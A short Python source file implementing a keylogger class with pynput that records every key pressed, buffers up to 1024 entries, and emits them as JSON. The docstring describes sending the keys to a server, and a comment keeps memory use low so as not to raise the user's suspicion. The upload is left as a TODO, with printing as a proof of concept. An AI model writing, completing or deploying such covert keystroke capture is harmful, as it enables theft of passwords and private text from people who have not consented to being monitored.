from typing import List, Final, Dict, Optional, Union
import json

from pynput import keyboard  # type: ignore
from pynput.keyboard import Key, KeyCode  # type: ignore

# Maximum number of keys to save, keep low to avoid memory issues
# that could warrant concern from user
SAVED_KEYS_LIMIT: Final[int] = 1024


class Keylogger:
    """
    Logs keyboard events by their names at a lot limit of 1024 then sends logged keys
    to server as JSON.

    Example
    -------

    {"keys_pressed": ["shift", "space", ...] }
    """

    __keys_pressed: List[str] = []
    __pressed: Optional[str] = None

    def log_key(self, key: Union[Key, KeyCode]):
        """
        Logs keyboard event

        Paramters
        ---------

        event: keyboard.Key
             Event to log
        """
        try:
            if self.__pressed != key.char:
                self.__pressed = key.char
                self.__keys_pressed.append(key.char)
        except AttributeError:
            if self.__pressed != key.name:
                self.__pressed = key.name
                self.__keys_pressed.append(key.name)

        if len(self.__keys_pressed) >= SAVED_KEYS_LIMIT:
            # TODO: make network call to server
            #
            # Proof of concept: print to terminal
            print(self.__to_json())
            self.__keys_pressed.clear()

    def __to_json(self) -> str:
        """
        Converts the current object to JSON

        Returns
        -------

        str
             Object represented as JSON
             { "keys_pressed": ["shift", "space", ...] }
        """
        keys_json: Dict[str, List[str]] = {"keys_pressed": self.__keys_pressed}
        return json.dumps(keys_json)


keylogger = Keylogger()
with keyboard.Listener(on_press=keylogger.log_key) as listener:
    listener.join()
